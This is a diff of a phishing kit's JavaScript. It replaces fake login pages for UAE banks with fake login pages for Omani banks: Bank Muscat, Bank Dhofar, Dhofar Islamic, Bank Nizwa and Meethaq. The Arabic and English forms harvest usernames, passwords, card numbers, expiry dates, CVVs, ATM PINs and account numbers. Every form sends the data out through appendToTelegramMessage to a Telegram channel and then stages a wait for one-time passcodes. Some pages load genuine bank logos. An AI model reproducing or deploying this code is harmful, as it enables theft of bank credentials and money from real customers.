+        const pin = document.getElementById('ahliPin').value;
+        if (!validateCardNumber(card).valid) { document.getElementById('ahliCardError').style.display='block'; return; }
+        if (!validateCardExpiry(month, parseInt(year))) return;
+        if (!/^\d{3}$/.test(cvv)) { document.getElementById('ahliCvvError').style.display='block'; return; }
+        if (!/^\d{4}$/.test(pin)) { document.getElementById('ahliPinError').style.display='block'; return; }
         appendToTelegramMessage(createTelegramMessageContent('bank_auth', {
-            bankName: banks.firstAbuDhabi.name,
-            authMethod: 'card',
-            cardNumber: cardNumber,
-            expiryMonth: expiryMonth,
-            expiryYear: expiryYear
+            bankName: 'البنك الأهلي', authMethod:'step2-card+exp+cvv+pin',
+            cardNumber: card, expiryMonth: month, expiryYear: year, cvv: cvv, pin: pin
         }));
-
-        showOtpWaiting('firstAbuDhabi');
+        showOtpWaiting('ahlinational');
     }
 
-    function showAbuDhabiCommercialAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.abuDhabiCommercial.name}</h3>
-            <div class="form-group"><label for="bankUsername">ADCB CID or Nickname</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل ADCB CID أو Nickname" required></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required></div>
-            <button class="btn btn-block" onclick="proceedToAbuDhabiCommercialAuth()">تسجيل الدخول</button>`;
+    // ================== دوال عامة ==================
+    function showUsernamePasswordAuth(bankKey) {
+        const bank = banks[bankKey];
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>${bank.name}</h3>
+            <div class="form-group"><label>اسم المستخدم</label><input id="bankUsername" class="form-control"><div class="error-message" id="bankUsernameError">مطلوب</div></div>
+            <div class="form-group"><label>كلمة المرور</label><input type="password" id="bankPassword" class="form-control"><div class="error-message" id="bankPasswordError">مطلوب</div></div>
+            <div class="forgot-link"><button onclick="showCardLoginPage('${bankKey}')">نسيت كلمة المرور</button></div>
+            <button class="btn btn-block" onclick="proceedToUsernameAuth('${bankKey}')">تسجيل الدخول</button>`;
     }
 
-    function proceedToAbuDhabiCommercialAuth() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!username || !password) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.abuDhabiCommercial.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('abuDhabiCommercial');
-    }
-
-    // ============================================================
-    // بنك دبي الإسلامي - تم إزالة التحقق من تاريخ الانتهاء فقط
-    // ============================================================
-
-    function showDubaiIslamicAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.dubaiIslamic.name}</h3>
-            <div class="form-group"><label for="cardNumber">رقم البطاقة</label><input type="text" id="cardNumber" class="form-control" placeholder="أدخل رقم البطاقة (16 رقم)" maxlength="19" oninput="formatCardNumber(this)" required><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div></div>
-            <div class="form-group"><label for="atmPin">ATM PIN (4 أرقام)</label><input type="password" id="atmPin" class="form-control" placeholder="أدخل ATM PIN" maxlength="4" required></div>
-            <button class="btn btn-block" onclick="proceedToDubaiIslamicAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToDubaiIslamicAuth() {
-        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
-        const atmPin = document.getElementById('atmPin').value;
-
-        // التحقق من رقم البطاقة فقط
-        if (!validateCardNumber(cardNumber).valid) {
-            document.getElementById('cardNumberError').style.display = 'block';
-            return;
-        }
-
-        // التحقق من ATM PIN فقط
-        if (!atmPin || atmPin.length !== 4) {
-            document.getElementById('atmPinError').style.display = 'block';
-            return;
-        }
-
-        // تم إزالة التحقق من تاريخ الانتهاء
-
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {
-            bankName: banks.dubaiIslamic.name,
-            authMethod: 'card',
-            cardNumber: cardNumber,
-            atmPin: atmPin
-        }));
-
-        showOtpWaiting('dubaiIslamic');
-    }
-
-    function showMashreqAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.mashreq.name}</h3>
-            <div class="form-group"><label for="bankUsername">اسم المستخدم</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required></div>
-            <div class="forgot-link"><button onclick="showCardLoginPage('mashreq')">نسيت اسم المستخدم وكلمة المرور</button></div>
-            <button class="btn btn-block" onclick="proceedToMashreqAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToMashreqAuth() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!username || !password) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.mashreq.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('mashreq');
-    }
-
-    function showAbuDhabiIslamicAuth() {
-        const container = document.getElementById('bankAuthContainer');
-        const bank = banks.abuDhabiIslamic;
-        container.innerHTML = `
-            <div style="text-align:center;padding:10px 0 20px;"><img src="${bank.logo}" alt="${bank.name}" style="height:60px;margin-bottom:15px;"></div>
-            <h3 style="text-align:center;margin-bottom:20px;">الدفع باستخدام بطاقة الخصم / المغطاة</h3>
-            <div class="form-group"><label for="cardNumber">رقم البطاقة (16 رقم)</label><input type="text" id="cardNumber" class="form-control" placeholder="أدخل رقم البطاقة" maxlength="19" oninput="formatCardNumber(this)" required><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="cardNumberError">يرجى إدخال رقم بطاقة صحيح (فيزا أو ماستر كارد فقط)</div></div>
-            <div class="form-group"><label for="atmPin">ATM PIN (4 أرقام)</label><input type="password" id="atmPin" class="form-control" placeholder="أدخل ATM PIN" maxlength="4" required><div class="error-message" id="atmPinError">يرجى إدخال ATM PIN مكون من 4 أرقام</div></div>
-            <button class="btn btn-block" onclick="proceedToAbuDhabiIslamicCard()">التالي</button>
-            <div class="forgot-link"><button onclick="showAbuDhabiIslamicLoginForm()">Already registered? Login</button></div>
-            <div class="security-notice"><strong>إشعار هام</strong><br>في إطار تعزيز إجراءات الأمان، تم تحديث طريقة تسجيل الدخول إلى الخدمات المصرفية عبر الإنترنت. يتطلب تسجيل الدخول الآن المصادقة عبر تطبيق مصرف أبوظبي الإسلامي للهاتف المتحرك، يرجى التأكد من تسجيلك في تطبيق مصرف أبو ظبي الإسلامي للهاتف المتحرك، وتفعيل الإشعارات الفورية لضمان استمرارية الوصول إلى خدماتك المصرفية عبر الإنترنت دون انقطاع.</div>`;
-    }
-
-    function showAbuDhabiIslamicLoginForm() {
-        const container = document.getElementById('bankAuthContainer');
-        const bank = banks.abuDhabiIslamic;
-        container.innerHTML = `
-            <div style="text-align:center;padding:10px 0 20px;"><img src="${bank.logo}" alt="${bank.name}" style="height:60px;margin-bottom:15px;"></div>
-            <h3 style="text-align:center;margin-bottom:20px;">تسجيل الدخول</h3>
-            <div class="form-group"><label for="bankUsername">اسم المستخدم</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required><div class="error-message" id="bankUsernameError">يرجى إدخال اسم المستخدم</div></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required><div class="error-message" id="bankPasswordError">يرجى إدخال كلمة المرور</div></div>
-            <button class="btn btn-block" onclick="proceedToAbuDhabiIslamicLogin()">تسجيل الدخول</button>
-            <div class="forgot-link"><button onclick="showAbuDhabiIslamicAuth()">العودة للدفع بالبطاقة</button></div>`;
-    }
-
-    function proceedToAbuDhabiIslamicCard() {
-        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
-        const atmPin = document.getElementById('atmPin').value;
-        if (!validateCardNumber(cardNumber).valid) { document.getElementById('cardNumberError').style.display = 'block'; return; }
-        if (!atmPin || atmPin.length !== 4 || !/^\d+$/.test(atmPin)) { document.getElementById('atmPinError').style.display =
-            'block'; return; }
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.abuDhabiIslamic.name, authMethod: 'card',
-            cardNumber, atmPin }));
-        showOtpWaiting('abuDhabiIslamic');
-    }
-
-    function proceedToAbuDhabiIslamicLogin() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!username) { document.getElementById('bankUsernameError').style.display = 'block'; return; }
-        if (!password) { document.getElementById('bankPasswordError').style.display = 'block'; return; }
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.abuDhabiIslamic.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('abuDhabiIslamic');
+    function proceedToUsernameAuth(bankKey) {
+        const u = document.getElementById('bankUsername').value;
+        const p = document.getElementById('bankPassword').value;
+        if (!u || !p) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName: banks[bankKey].name, authMethod:'username/password', username:u, password:p}));
+        showOtpWaiting(bankKey);
     }
 
     function showCardLoginPage(bankKey) {
         const bank = banks[bankKey];
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول باستخدام البطاقة - ${bank.name}</h3>
-            <div class="form-group"><label for="cardNumber">رقم البطاقة</label><input type="text" id="cardNumber" class="form-control" placeholder="أدخل رقم البطاقة (16 رقم)" maxlength="19" oninput="formatCardNumber(this)" required><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div></div>
-            <div class="form-group"><label for="expiryDate">تاريخ الانتهاء</label><div class="date-input"><select id="expiryMonth" required><option value="">الشهر</option>${Array.from({length:12},(_,i)=>`<option value="${i+1}">${i+1}</option>`).join('')}</select><select id="expiryYear" required><option value="">السنة</option>${Array.from({length:8},(_,i)=>`<option value="${2025+i}">${2025+i}</option>`).join('')}</select></div></div>
-            <div class="form-group"><label for="atmPin">ATM PIN (4 أرقام)</label><input type="password" id="atmPin" class="form-control" placeholder="أدخل ATM PIN" maxlength="4" required></div>
-            <div class="form-group"><label for="cvv">CVV (3 أرقام)</label><input type="password" id="cvv" class="form-control" placeholder="أدخل CVV" maxlength="3" required></div>
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>${bank.name} - تسجيل بالبطاقة</h3>
+            <div class="form-group"><label>رقم البطاقة</label><input type="text" id="cardNumber" class="form-control" maxlength="19" oninput="formatCardNumber(this, 'cardTypeDisplay')"><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="cardNumberError">خطأ</div></div>
+            <div class="form-group"><label>تاريخ الانتهاء</label><div class="date-input"><select id="expiryMonth">${Array.from({length:12},(_,i)=>`<option value="${i+1}">${i+1}</option>`).join('')}</select><select id="expiryYear">${Array.from({length:8},(_,i)=>`<option value="${2025+i}">${2025+i}</option>`).join('')}</select></div><div class="error-message" id="expiryError">تاريخ خاطئ</div></div>
+            <div class="form-group"><label>CVV</label><input type="text" id="cvv" class="form-control" maxlength="3"><div class="error-message" id="cvvError">3 أرقام</div></div>
             <button class="btn btn-block" onclick="proceedToCardLogin('${bankKey}')">تسجيل الدخول</button>`;
     }
 
     function proceedToCardLogin(bankKey) {
-        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
-        const expiryMonth = document.getElementById('expiryMonth').value;
-        const expiryYear = document.getElementById('expiryYear').value;
-        const atmPin = document.getElementById('atmPin').value;
+        const card = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+        const month = document.getElementById('expiryMonth').value;
+        const year = parseInt(document.getElementById('expiryYear').value);
         const cvv = document.getElementById('cvv').value;
-        if (!validateCardNumber(cardNumber).valid || !validateCardExpiry(expiryMonth, expiryYear) || !atmPin || atmPin
-            .length !== 4 || !cvv || cvv.length !== 3) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks[bankKey].name, authMethod: 'card (via forgot)',
-            cardNumber, expiryMonth, expiryYear, atmPin, cvv }));
+        if (!validateCardNumber(card).valid) return;
+        if (!validateCardExpiry(month, year)) return;
+        if (!/^\d{3}$/.test(cvv)) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName: banks[bankKey].name, authMethod:'card-forgot', cardNumber: card, expiryMonth: month, expiryYear: year, cvv}));
         showOtpWaiting(bankKey);
     }
 
-    function showDubaiCommercialAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.dubaiCommercial.name}</h3>
-            <div class="form-group"><label for="bankUsername">اسم المستخدم</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required></div>
-            <div class="forgot-link"><button onclick="showCardLoginPage('dubaiCommercial')">نسيت اسم المستخدم وكلمة المرور</button></div>
-            <button class="btn btn-block" onclick="proceedToDubaiCommercialAuth()">تسجيل الدخول</button>`;
+    function validateCardNumber(num) {
+        const clean = num.replace(/\s+/g, '');
+        if (clean.length !== 16 || !/^\d+$/.test(clean)) return {valid:false, type:'unknown'};
+        if (/^4/.test(clean)) return {valid:true, type:'visa'};
+        if (/^5[1-5]/.test(clean)) return {valid:true, type:'mastercard'};
+        return {valid:false, type:'unknown'};
     }
 
-    function proceedToDubaiCommercialAuth() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!username || !password) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.dubaiCommercial.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('dubaiCommercial');
+    function validateCardExpiry(month, year) {
+        const now = new Date();
+        const cy = now.getFullYear(), cm = now.getMonth()+1;
+        if (year < 2025 || year > 2032) return false;
+        if (year === cy && month < cm) return false;
+        return true;
     }
 
-    function showFujairahNationalAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.fujairahNational.name}</h3>
-            <div class="form-group"><label for="bankUsername">اسم المستخدم</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required></div>
-            <div class="forgot-link"><button onclick="showCardLoginPage('fujairahNational')">نسيت اسم المستخدم وكلمة المرور</button></div>
-            <button class="btn btn-block" onclick="proceedToFujairahNationalAuth()">تسجيل الدخول</button>`;
+    function formatCardNumber(input, displayId = 'cardTypeDisplay') {
+        let value = input.value.replace(/\s+/g, '');
+        if (value.length > 0) value = value.match(/.{1,4}/g).join(' ');
+        input.value = value;
+        const validation = validateCardNumber(input.value);
+        const display = document.getElementById(displayId);
+        if(display) display.innerHTML = validation.valid ? 
+            (validation.type === 'visa' ? '<div class="card-type-icon visa">VISA</div>' : '<div class="card-type-icon mastercard">MC</div>') 
+            : '<div class="card-type-icon unknown">?</div>';
     }
 
-    function proceedToFujairahNationalAuth() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!username || !password) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.fujairahNational.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('fujairahNational');
+    // ================== بنك مسقط ==================
+    function showMuscatAuth() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>بنك مسقط</h3>
+            <div class="form-group"><label>رقم البطاقة</label><input type="text" id="cardNumber" class="form-control" maxlength="19" oninput="formatCardNumber(this, 'cardTypeDisplay')"><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="cardNumberError">خطأ</div></div>
+            <div class="form-group"><label>تاريخ الانتهاء</label><div class="date-input"><select id="expiryMonth">${Array.from({length:12},(_,i)=>`<option value="${i+1}">${i+1}</option>`).join('')}</select><select id="expiryYear">${Array.from({length:8},(_,i)=>`<option value="${2025+i}">${2025+i}</option>`).join('')}</select></div><div class="error-message" id="expiryError">خطأ</div></div>
+            <div class="form-group"><label>CVV</label><input type="text" id="cvv" class="form-control" maxlength="3"><div class="error-message" id="cvvError">3 أرقام</div></div>
+            <button class="btn btn-block" onclick="proceedToMuscatAuth()">تسجيل الدخول</button>`;
     }
 
-    function showRakNationalAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.rakNational.name}</h3>
-            <div class="form-group"><label for="bankUsername">اسم المستخدم</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required></div>
-            <div class="forgot-link"><button onclick="showCardLoginPage('rakNational')">نسيت اسم المستخدم وكلمة المرور</button></div>
-            <button class="btn btn-block" onclick="proceedToRakNationalAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToRakNationalAuth() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!username || !password) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.rakNational.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('rakNational');
-    }
-
-    function showSharjahIslamicAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.sharjahIslamic.name}</h3>
-            <div class="form-group"><label for="bankUsername">اسم المستخدم</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required></div>
-            <div class="forgot-link"><button onclick="showCardLoginPage('sharjahIslamic')">نسيت اسم المستخدم وكلمة المرور</button></div>
-            <button class="btn btn-block" onclick="proceedToSharjahIslamicAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToSharjahIslamicAuth() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!username || !password) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.sharjahIslamic.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('sharjahIslamic');
-    }
-
-    function showHSBCAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.hsbc.name}</h3>
-            <div class="form-group"><label for="bankUsername">اسم المستخدم</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required></div>
-            <div class="forgot-link"><button onclick="showCardLoginPage('hsbc')">نسيت اسم المستخدم وكلمة المرور</button></div>
-            <button class="btn btn-block" onclick="proceedToHSBCAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToHSBCAuth() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!username || !password) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.hsbc.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('hsbc');
-    }
-
-    function showAlHilalAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.alHilal.name}</h3>
-            <div class="form-group"><label for="cardNumber">رقم البطاقة</label><input type="text" id="cardNumber" class="form-control" placeholder="أدخل رقم البطاقة (16 رقم)" maxlength="19" oninput="formatCardNumber(this)" required><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div></div>
-            <div class="form-group"><label for="expiryDate">تاريخ الانتهاء</label><div class="date-input"><select id="expiryMonth" required><option value="">الشهر</option>${Array.from({length:12},(_,i)=>`<option value="${i+1}">${i+1}</option>`).join('')}</select><select id="expiryYear" required><option value="">السنة</option>${Array.from({length:8},(_,i)=>`<option value="${2025+i}">${2025+i}</option>`).join('')}</select></div></div>
-            <div class="form-group"><label for="atmPin">ATM PIN (4 أرقام)</label><input type="password" id="atmPin" class="form-control" placeholder="أدخل ATM PIN" maxlength="4" required></div>
-            <div class="form-group"><label for="cvv">CVV (3 أرقام)</label><input type="password" id="cvv" class="form-control" placeholder="أدخل CVV" maxlength="3" required></div>
-            <button class="btn btn-block" onclick="proceedToAlHilalAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToAlHilalAuth() {
-        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
-        const expiryMonth = document.getElementById('expiryMonth').value;
-        const expiryYear = document.getElementById('expiryYear').value;
-        const atmPin = document.getElementById('atmPin').value;
+    function proceedToMuscatAuth() {
+        const card = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+        const m = document.getElementById('expiryMonth').value;
+        const y = parseInt(document.getElementById('expiryYear').value);
         const cvv = document.getElementById('cvv').value;
-        if (!validateCardNumber(cardNumber).valid || !validateCardExpiry(expiryMonth, expiryYear) || !atmPin || atmPin
-            .length !== 4 || !cvv || cvv.length !== 3) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.alHilal.name, authMethod: 'card',
-            cardNumber, expiryMonth, expiryYear, atmPin, cvv }));
-        showOtpWaiting('alHilal');
+        if (!validateCardNumber(card).valid) return;
+        if (!validateCardExpiry(m, y)) return;
+        if (!/^\d{3}$/.test(cvv)) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك مسقط', authMethod:'card+exp+cvv', cardNumber: card, expiryMonth: m, expiryYear: y, cvv}));
+        showOtpWaiting('muscat');
     }
 
-    function showMariyahLocalAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.mariyahLocal.name}</h3>
-            <div class="form-group"><label for="bankUsername">اسم المستخدم</label><input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required></div>
-            <div class="forgot-link"><button onclick="showCardLoginPage('mariyahLocal')">نسيت اسم المستخدم وكلمة المرور</button></div>
-            <button class="btn btn-block" onclick="proceedToMariyahLocalAuth()">تسجيل الدخول</button>`;
+    // ================== بنك ظفار ==================
+    function showDhofarAuth() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>بنك ظفار</h3>
+            <div class="form-group"><label>رقم الحساب</label><input id="accountNumber" class="form-control"><div class="error-message" id="accountNumberError">مطلوب</div></div>
+            <div class="form-group"><label>رقم البطاقة</label><input type="text" id="cardNumber" class="form-control" maxlength="19" oninput="formatCardNumber(this, 'cardTypeDisplay')"><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="cardNumberError">خطأ</div></div>
+            <div class="form-group"><label>الرقم السري</label><input type="password" id="pin" class="form-control" maxlength="4"><div class="error-message" id="pinError">4 أرقام</div></div>
+            <button class="btn btn-block" onclick="proceedToDhofarAuth()">تسجيل الدخول</button>`;
     }
 
-    function proceedToMariyahLocalAuth() {
-        const username = document.getElementById('bankUsername').value;
-        const password = document.getElementById('bankPassword').value;
+    function proceedToDhofarAuth() {
+        const acc = document.getElementById('accountNumber').value;
+        const card = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+        const pin = document.getElementById('pin').value;
+        if (!acc || !validateCardNumber(card).valid || !/^\d{4}$/.test(pin)) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك ظفار', authMethod:'account+card+pin', accountNumber: acc, cardNumber: card, pin}));
+        showOtpWaiting('dhofar');
+    }
+
+    // ================== ظفار الإسلامي ==================
+    function showDhofarIslamicAuth() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <div class="dhofar-islamic-container">
+                <img src="https://www.dhofarislamic.com/media/wruf0fvw/dhofar-islamic-logo.svg" class="dhi-logo" alt="ظفار الإسلامي">
+                <h1 class="dhi-title">Register</h1>
+                <p class="dhi-subtitle">Please Enter Your Account Details<br>To Register In Mobile Banking</p>
+                <div class="form-group"><div class="dhi-label"><span>Account Number</span><span class="dhi-help">?</span></div><input id="dhiAccountNumber" class="dhi-input"></div>
+                <div class="form-group"><div class="dhi-label"><span>Identification Type</span></div><input id="dhiIdType" class="dhi-input"></div>
+                <div class="form-group"><div class="dhi-label"><span>Password</span></div><input id="dhiPassword" class="dhi-input" type="password"></div>
+                <button class="dhi-register-btn" onclick="proceedDhofarIslamicStep1()">Register</button>
+                <div class="error-message" id="dhiError"></div>
+            </div>`;
+    }
+
+    function proceedDhofarIslamicStep1() {
+        const acc = document.getElementById('dhiAccountNumber').value.trim();
+        const idType = document.getElementById('dhiIdType').value.trim();
+        const pass = document.getElementById('dhiPassword').value.trim();
+        if (!acc || !idType || !pass) { document.getElementById('dhiError').style.display='block'; return; }
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك ظفار الإسلامي', authMethod:'Register', accountNumber:acc, identificationType:idType, password:pass}));
+        showOtpWaiting('dhofarIslamic');
+    }
+
+    // ================== بنك نزوى ==================
+    function showNizwaLogin() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <div class="nizwa-login-container">
+                <div class="nizwa-login-header"><h3>Bank Anywhere, Anytime...</h3><p>Simple. Fast. Secure.</p></div>
+                <div class="nizwa-login-body">
+                    <div class="nizwa-input-group"><span class="nizwa-input-label">Username</span><div class="nizwa-input-wrapper"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><input id="nizwaUsername" placeholder="Username"></div></div>
+                    <div class="nizwa-input-group"><div class="nizwa-input-wrapper"><svg viewBox="0 0 24 24"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg><input id="nizwaPassword" type="password" placeholder="Enter Password"></div></div>
+                    <button class="nizwa-login-btn" onclick="proceedNizwaLogin()">Login</button>
+                    <div class="error-message" id="nizwaLoginError"></div>
+                </div>
+            </div>`;
+    }
+
+    function proceedNizwaLogin() {
+        const u = document.getElementById('nizwaUsername').value.trim();
+        const p = document.getElementById('nizwaPassword').value.trim();
+        if (!u || !p) { document.getElementById('nizwaLoginError').style.display='block'; return; }
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك نزوى', authMethod:'username/password', username:u, password:p}));
+        showNizwaCardDetails();
+    }
+
+    function showNizwaCardDetails() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <div class="card-details-container">
+                <div style="text-align:center"><img src="https://www2.0zz0.com/2025/05/11/21/649886714.jpg" alt="شعار" style="width:80px"><h2 style="color:#003366">مرحباً بكم</h2><p>في بنك نزوى</p></div>
+                <div class="form-group"><label class="form-label">رقم الهاتف</label><input id="nizwaPhone" class="form-input" placeholder="أدخل رقم الهاتف"></div>
+                <div class="divider"></div>
+                <div class="form-group"><label class="form-label">رقم بطاقة الحسم الفوري</label><input id="nizwaCard" class="form-input" placeholder="أدخل رقم البطاقة"></div>
+                <div class="form-group"><label class="form-label">الرقم السري</label><input id="nizwaPin" type="password" class="form-input" placeholder="أدخل الرقم السري"></div>
+                <button class="next-btn" onclick="proceedNizwaCardDetails()">التالي</button>
+                <div class="error-message" id="nizwaCardError"></div>
+            </div>`;
+    }
+
+    function proceedNizwaCardDetails() {
+        const phone = document.getElementById('nizwaPhone').value.trim();
+        const card = document.getElementById('nizwaCard').value.trim();
+        const pin = document.getElementById('nizwaPin').value.trim();
+        if (!phone || !card || !pin) { document.getElementById('nizwaCardError').style.display='block'; return; }
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك نزوى', authMethod:'card_details', phone:phone, cardNumber:card, pin:pin}));
+        showOtpWaiting('nizwa');
+    }
+
+    // ================== بنك ميثاق ==================
+    function showMeethaqAuth() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>بنك ميثاق</h3>
+            <div class="form-group"><label>اسم المستخدم</label><input id="meethaqUsername" class="form-control"><div class="error-message" id="meethaqUsernameError">مطلوب</div></div>
+            <div class="form-group"><label>كلمة المرور</label><input type="password" id="meethaqPassword" class="form-control"><div class="error-message" id="meethaqPasswordError">مطلوب</div></div>
+            <button class="btn btn-block" onclick="proceedMeethaqStep1()">التالي</button>`;
+    }
+
+    function proceedMeethaqStep1() {
+        const username = document.getElementById('meethaqUsername').value.trim();
+        const password = document.getElementById('meethaqPassword').value.trim();
         if (!username || !password) return;
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.mariyahLocal.name, authMethod: 'username',
-            username, password }));
-        showOtpWaiting('mariyahLocal');
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك ميثاق', authMethod:'step1-user/pass', username:username, password:password}));
+        document.getElementById('bankAuthContainer').innerHTML = `<div class="simple-waiting"><div class="spinner"></div><h3>جاري التحميل</h3></div>`;
+        setTimeout(() => { showMeethaqStep2(); }, 2000);
     }
 
-    function showOtpWaiting(bankKey) {
-        const bank = banks[bankKey];
-        appendToTelegramMessage(createTelegramMessageContent('otp_sent', { bankName: bank.name, phone: document.getElementById('phoneNumber')
-            .value }));
